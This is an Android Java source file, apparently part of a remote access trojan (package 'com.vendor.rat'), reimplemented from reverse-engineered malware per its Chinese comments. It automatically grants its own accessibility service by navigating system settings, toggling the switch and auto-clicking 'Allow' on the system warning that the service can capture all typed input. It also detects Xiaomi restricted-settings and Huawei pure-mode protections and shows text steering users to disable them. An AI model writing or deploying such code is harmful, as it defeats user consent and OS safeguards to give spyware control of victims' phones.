package com.vendor.rat.auto.engine;

import android.content.Intent;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.auto.filter.NodeFilter;
import com.vendor.rat.service.MyAccessibilityService;
import com.vendor.rat.utils.DeviceUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * 无障碍服务自动开启引擎
 *
 * 基于逆向分析 Part 6: 无障碍服务权限自动授予
 *
 * 执行流程:
 *   1. execute() → 打开 ACTION_ACCESSIBILITY_SETTINGS
 *   2. 监听 AccessibilitySettings 界面
 *   3. 查找服务名称 → 点击进入详情
 *   4. 查找 Switch → 点击开启
 *   5. 处理警告对话框 → 点击 "允许" / "确定"
 *
 * 厂商特殊处理:
 *   - 小米: 检测 "受限设置" 提示
 *   - 华为: 检测纯净模式
 */
public class AccessibilityServiceEngine extends AutoEngine {

    private static final String TAG = "A11yServiceEngine";

    // 包名
    private static final String SETTINGS = "com.android.settings";

    // 无障碍设置界面类名
    private static final String ACCESSIBILITY_SETTINGS =
        "com.android.settings.accessibility.AccessibilitySettings";
    private static final String ACCESSIBILITY_DETAIL =
        "com.android.settings.accessibility.ToggleAccessibilityServicePreferenceFragment";

    // 状态
    private final AtomicBoolean enabled = new AtomicBoolean(false);

    // 服务名称 (用于在列表中查找)
    private String serviceName;

    // 厂商限制检测结果
    private boolean xiaomiRestricted = false;
    private boolean huaweiPureMode = false;

    /**
     * 厂商限制回调接口
     */
    public interface VendorRestrictionListener {
        /** 小米受限设置 — 需要用户手动操作 */
        void onXiaomiRestrictedSettings(String guideText);
        /** 华为纯净模式 — 需要用户手动关闭 */
        void onHuaweiPureMode(String guideText);
    }

    private VendorRestrictionListener restrictionListener;

    public AccessibilityServiceEngine() {
        super(buildWindowMatchers(), SETTINGS);
    }

    private static List<WindowMatcher> buildWindowMatchers() {
        List<WindowMatcher> list = new ArrayList<>();

        // 无障碍设置主界面
        WindowMatcher settings = new WindowMatcher(SETTINGS, ACCESSIBILITY_SETTINGS);
        settings.addEventType(32);     // TYPE_WINDOW_STATE_CHANGED
        settings.addEventType(16384);  // TYPE_WINDOW_CONTENT_CHANGED
        list.add(settings);

        // 无障碍服务详情页 (不同厂商类名可能不同，用主包名兜底)
        list.add(new WindowMatcher(SETTINGS, ACCESSIBILITY_DETAIL));

        return list;
    }

    /**
     * 重写窗口匹配 — 兼容不同厂商的无障碍设置类名
     */
    @Override
    public boolean matchWindow(String packageName, String className, int eventType) {
        if (!SETTINGS.equals(packageName)) return false;
        if (className == null) return false;

        // 无障碍设置主界面
        if (className.contains("AccessibilitySettings")
                || className.contains("accessibility")) {
            return true;
        }
        // 无障碍服务详情/开关页
        if (className.contains("ToggleAccessibilityService")
                || className.contains("AccessibilityService")) {
            return true;
        }
        // 对话框 (警告确认)
        if (className.contains("AlertDialog")) {
            return true;
        }
        return false;
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        if (enabled.get()) return;

        log("Window matched: " + className);

        try {
            if (className.contains("AlertDialog")) {
                handleWarningDialog();
            } else if (className.contains("ToggleAccessibilityService")
                    || className.contains("AccessibilityServicePreference")) {
                handleServiceDetailPage();
            } else if (className.contains("AccessibilitySettings")
                    || className.contains("accessibility")) {
                handleAccessibilityListPage();
            }
        } catch (Exception e) {
            logError("Error handling accessibility settings", e);
        }
    }

    @Override
    public void execute() {
        // 检查是否已启用
        MyAccessibilityService service = MyAccessibilityService.getInstance();
        if (service != null) {
            log("Accessibility service already running");
            enabled.set(true);
            finish();
            return;
        }

        // 厂商限制预检
        checkVendorRestrictions();

        openAccessibilitySettings();
    }

    // ============ 打开设置 ============

    private void openAccessibilitySettings() {
        try {
            MyAccessibilityService svc = MyAccessibilityService.getInstance();
            if (svc == null) {
                // 服务未运行时无法通过服务启动 Activity
                // 需要通过 PermissionActivity 或其他 Context 启动
                log("Service not running, cannot open settings directly");
                return;
            }

            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            svc.startActivity(intent);
            log("Opened accessibility settings");
        } catch (Exception e) {
            logError("Failed to open accessibility settings", e);
        }
    }

    // ============ 无障碍服务列表页 ============

    /**
     * 处理无障碍设置列表页
     * 基于逆向 Part 6: 查找服务名称 → 点击进入详情
     */
    private void handleAccessibilityListPage() {
        sleep(500);
        UiNode root = getRootNode();
        if (root == null) return;

        // 小米: 检测受限设置提示
        if (DeviceUtils.isXiaomi()) {
            checkXiaomiRestricted(root);
        }

        // 查找服务名称
        String name = getServiceName();
        UiNode serviceNode = root.findOneByTextContains(name);

        if (serviceNode == null) {
            // 滚动查找
            UiNode scrollable = getScrollableNode();
            if (scrollable != null) {
                serviceNode = scrollable.scrollForwardUntil(
                    StringCondition.textContains(name));
            }
        }

        if (serviceNode != null) {
            log("Found service: " + name);
            serviceNode.click();
            sleep(500);
        } else {
            logError("Service not found in list: " + name);
        }
    }

    // ============ 服务详情页 ============

    /**
     * 处理无障碍服务详情页
     * 基于逆向 Part 6: 查找 Switch → 点击开启
     */
    private void handleServiceDetailPage() {
        sleep(500);
        UiNode root = getRootNode();
        if (root == null) return;

        // 查找 Switch 控件
        UiNode switchBtn = root.findOneByClassName("android.widget.Switch");
        if (switchBtn == null) {
            // 某些厂商使用 ToggleButton
            switchBtn = root.findOneByClassName("android.widget.ToggleButton");
        }

        if (switchBtn != null) {
            if (!switchBtn.isChecked()) {
                switchBtn.click();
                log("Clicked accessibility service switch");
                // 等待警告对话框弹出
                sleep(500);
            } else {
                log("Accessibility service already enabled");
                enabled.set(true);
                finish();
                performBack();
            }
        } else {
            logError("Switch not found on detail page");
        }
    }

    // ============ 警告对话框 ============

    /**
     * 处理无障碍服务警告对话框
     * "此服务可能会收集您输入的所有内容..."
     * 基于逆向 Part 6: 查找 "允许" / "确定" 按钮
     */
    private void handleWarningDialog() {
        sleep(300);
        UiNode root = getRootNode();
        if (root == null) return;

        // 查找 "允许" 按钮
        UiNode allowBtn = root.findOneByCombine(
            CombineFilter.or(
                CombineFilter.button("允许"),
                CombineFilter.button("确定"),
                CombineFilter.button("OK"),
                CombineFilter.button("Allow")
            )
        );

        if (allowBtn != null) {
            allowBtn.click();
            log("Clicked allow button in warning dialog");
            enabled.set(true);
            sleep(500);
            finish();
            performBack();
            return;
        }

        // 某些厂商使用 TextView 而非 Button
        UiNode allowText = root.findOneByCombine(
            CombineFilter.or(
                StringCondition.textContains("允许"),
                StringCondition.textContains("确定"),
                StringCondition.textContains("OK")
            )
        );

        if (allowText != null && allowText.isClickable()) {
            allowText.click();
            log("Clicked allow text in warning dialog");
            enabled.set(true);
            finish();
            performBack();
        }
    }

    // ============ 厂商限制检测 ============

    /**
     * 检查厂商限制
     */
    private void checkVendorRestrictions() {
        if (DeviceUtils.isHuawei()) {
            checkHuaweiPureMode();
        }
    }

    /**
     * 小米: 检测受限设置
     * 基于逆向 Part 6.2: bypassMiuiRestrictedSettings()
     */
    private void checkXiaomiRestricted(UiNode root) {
        UiNode restrictedMsg = root.findOneByTextContains("受限设置");
        if (restrictedMsg != null) {
            xiaomiRestricted = true;
            log("Xiaomi restricted settings detected");

            if (restrictionListener != null) {
                restrictionListener.onXiaomiRestrictedSettings(
                    "检测到小米受限设置\n\n" +
                    "操作步骤:\n" +
                    "1. 进入应用列表，找到本应用并点击\n" +
                    "2. 在应用详情页，点击右上角的更多菜单\n" +
                    "3. 在弹出的菜单列表里，点击[允许受限设置]\n" +
                    "4. 部分机型的[允许受限设置]在应用详情页底部"
                );
            }
        }
    }

    /**
     * 华为: 检测纯净模式
     * 基于逆向 Part 6.2: bypassHuaweiPureMode()
     * 纯净模式无法通过无障碍服务自动关闭，必须用户手动操作
     */
    private void checkHuaweiPureMode() {
        // 纯净模式检测需要在 Activity 中进行 (PackageManager 查询)
        // 这里只设置标志，由 PermissionActivity 处理
        if (restrictionListener != null) {
            huaweiPureMode = true;
            restrictionListener.onHuaweiPureMode(
                "检测到华为纯净模式，需要关闭后才能使用\n\n" +
                "操作步骤:\n" +
                "设置 → 系统和更新 → 纯净模式 → 退出"
            );
        }
    }

    // ============ Getters & Setters ============

    private String getServiceName() {
        return serviceName != null ? serviceName : "com.vendor.rat";
    }

    public void setServiceName(String serviceName) {
        this.serviceName = serviceName;
    }

    public void setRestrictionListener(VendorRestrictionListener listener) {
        this.restrictionListener = listener;
    }

    public boolean isEnabled() { return enabled.get(); }
    public boolean isXiaomiRestricted() { return xiaomiRestricted; }
    public boolean isHuaweiPureMode() { return huaweiPureMode; }
}
